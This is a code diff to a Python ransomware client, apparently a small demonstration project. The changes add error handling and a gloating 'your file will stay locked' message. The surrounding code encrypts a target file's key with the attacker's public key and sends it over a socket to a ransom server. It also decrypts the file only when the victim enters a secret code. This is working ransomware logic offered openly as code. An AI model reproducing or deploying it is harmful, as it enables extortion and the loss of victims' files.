@@ -58,33 +58,43 @@ def decryptFile(filePath, key):
 # Send the key to ransomewareServer
 def sendEncryptedKey(eKeyFilePath):
 
-    with socket.create_connection((SERVER_HOST, SERVER_PORT)) as sock:
-        # Reuse existing socket if present
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    wrong_code = 0
 
-        # Read and send over our encrypted file    
-        with open(eKeyFilePath, "rb") as key_file:
-            enc_key = key_file.read()
-
-        sock.sendall(enc_key)
-        # Server should decrypt our key and send it back
-        key_from_server = sock.recv(1024).strip()
+    try:
         
-        response = str(input("Enter the secret code: "))
+        with socket.create_connection((SERVER_HOST, SERVER_PORT)) as sock:
+            # Reuse existing socket if present
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        if response == 'ivebeenhacked' :
-            print("Correct Code. Decrypting file...")
-            # Now we can decrypt our original file that was held for ransom
-            decryptFile(TARGET_FILE,key_from_server)
-            # Now delete the key...
-            remove(CLIENT_ENC_SYM_KEY_PATH)
-            print("Decryption Complete!")
+            # Read and send over our encrypted file    
+            with open(eKeyFilePath, "rb") as key_file:
+                enc_key = key_file.read()
 
-        else:
+            sock.sendall(enc_key)
+            # Server should decrypt our key and send it back
+            key_from_server = sock.recv(1024).strip()
+            
+            response = str(input("Enter the secret code: "))
 
-            print("Incorrect code!")
-            exit()
-            print("Still here...")
+            if response == 'ivebeenhacked' :
+                print("Correct Code. Decrypting file...")
+                # Now we can decrypt our original file that was held for ransom
+                decryptFile(TARGET_FILE,key_from_server)
+                # Now delete the key...
+                remove(CLIENT_ENC_SYM_KEY_PATH)
+                print("Decryption Complete!")
+
+            else:
+                print("Incorrect code!")
+                wrong_code = 1
+
+    except:
+
+        if wrong_code == 0:
+            print("Couldn't connect to ransomeware server...\nLooks like your file will stay locked 😈.")
+            print("\n\n[HINT] Make sure the server script is running")
+
+        exit()
 
 ##################
 #   MAIN      
@@ -92,7 +102,6 @@ def sendEncryptedKey(eKeyFilePath):
 
 # First - if there is an encrypted key - then we must have already encrypted the target text
 if path.isfile(CLIENT_ENC_SYM_KEY_PATH):
-    print("File encrypted...")
     sendEncryptedKey(CLIENT_ENC_SYM_KEY_PATH)
     exit()
 
@@ -118,6 +127,8 @@ clientEncryptedSymmetricKey = hostPublicKey.encrypt(
         label=None
     )
 )
+
+print("YOUR TARGET FILE HAS BEEN ENCRYPTED! 😈\n")
 
 # Write our encrypted clientEncryptedSymmetricKey to a file (wb = write binary)
 with open(CLIENT_ENC_SYM_KEY_PATH, "wb") as key_file:
